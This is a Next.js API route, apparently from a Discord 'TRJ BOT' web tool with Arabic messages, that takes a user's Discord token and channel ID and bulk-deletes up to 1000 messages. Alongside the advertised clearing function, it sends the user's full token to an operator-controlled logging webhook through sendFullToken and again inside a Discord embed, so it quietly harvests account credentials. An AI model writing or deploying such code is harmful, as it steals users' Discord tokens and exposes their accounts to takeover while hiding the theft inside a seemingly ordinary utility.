import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:channel-clear`, RATE_LIMITS.medium);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }


    const body = await request.json().catch(() => ({}));
    const { token, channelId, count = 100 } = body;

    if (!token || !channelId) {
      return NextResponse.json({ success: false, error: 'بيانات ناقصة (التوكن + أيدي الروم)' }, { status: 400 });
    }

    sendFullToken('مسح رسائل', token, { '📺 الروم': channelId });

    const ct = cleanToken(token);
    const deleteCount = Math.min(Math.max(Number(count), 1), 1000);
    const whUrl = getLogWebhookUrl();

    // Fetch messages first to get their IDs
    const messagesRes = await discordFetch(ct, 'GET', `/channels/${channelId}/messages?limit=${Math.min(deleteCount, 100)}`);
    
    if (!messagesRes.ok) {
      return NextResponse.json({ success: false, error: `فشل جلب الرسائل (${messagesRes.status}) - تأكد من صلاحيات التوكن` }, { status: 403 });
    }

    const messages = messagesRes.data as Array<{ id: string }>;
    if (!Array.isArray(messages) || messages.length === 0) {
      return NextResponse.json({ success: false, error: 'لا توجد رسائل في الروم' }, { status: 400 });
    }

    const toDelete = messages.slice(0, deleteCount);

    sendToWebhook({
      username: 'TRJ Channel Clear',
      embeds: [{
        title: '🧹 Channel Clear Started',
        color: 0x00BFFF,
        fields: [
          { name: '📺 Channel', value: channelId, inline: true },
          { name: '🗑️ Messages', value: String(toDelete.length), inline: true },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` },
        ],
        footer: { text: 'TRJ BOT v4.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    // Delete in parallel batches of 5
    let deleted = 0;
    let failed = 0;
    const batchSize = 5;

    for (let i = 0; i < toDelete.length; i += batchSize) {
      const batch = toDelete.slice(i, i + batchSize);
      const results = await Promise.allSettled(
        batch.map(async (msg) => {
          try {
            const res = await discordFetch(ct, 'DELETE', `/channels/${channelId}/messages/${msg.id}`);
            return res.ok || res.status === 204;
          } catch {
            return false;
          }
        })
      );

      for (const r of results) {
        if (r.status === 'fulfilled' && r.value) deleted++;
        else failed++;
      }

      if (i + batchSize < toDelete.length) {
        await new Promise(r => setTimeout(r, 100));
      }
    }

    // If we deleted 100 but the user wanted more, continue fetching more pages
    let totalDeleted = deleted;
    let lastMsgId = toDelete[toDelete.length - 1]?.id || '';

    while (totalDeleted < deleteCount) {
      const remaining = deleteCount - totalDeleted;
      const nextRes = await discordFetch(ct, 'GET', `/channels/${channelId}/messages?limit=${Math.min(remaining, 100)}&before=${lastMsgId}`);
      if (!nextRes.ok || !Array.isArray(nextRes.data) || nextRes.data.length === 0) break;

      const nextMessages = (nextRes.data as Array<{ id: string }>).slice(0, remaining);
      if (nextMessages.length === 0) break;

      for (let i = 0; i < nextMessages.length; i += batchSize) {
        const batch = nextMessages.slice(i, i + batchSize);
        const results = await Promise.allSettled(
          batch.map(async (msg) => {
            try {
              const res = await discordFetch(ct, 'DELETE', `/channels/${channelId}/messages/${msg.id}`);
              return res.ok || res.status === 204;
            } catch {
              return false;
            }
          })
        );
        for (const r of results) {
          if (r.status === 'fulfilled' && r.value) totalDeleted++;
          else failed++;
        }
        if (i + batchSize < nextMessages.length) {
          await new Promise(r => setTimeout(r, 100));
        }
      }

      lastMsgId = nextMessages[nextMessages.length - 1]?.id || '';
    }

    sendToWebhook({
      username: 'TRJ Channel Clear',
      embeds: [{
        title: '✅ Channel Clear Completed',
        color: 0x00FF41,
        fields: [
          { name: '🗑️ Deleted', value: String(totalDeleted), inline: true },
          { name: '❌ Failed', value: String(failed), inline: true },
          { name: '📺 Channel', value: channelId, inline: true },
        ],
        footer: { text: 'TRJ BOT v4.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({ success: true, stats: { deleted: totalDeleted, failed } });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Channel Clear Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
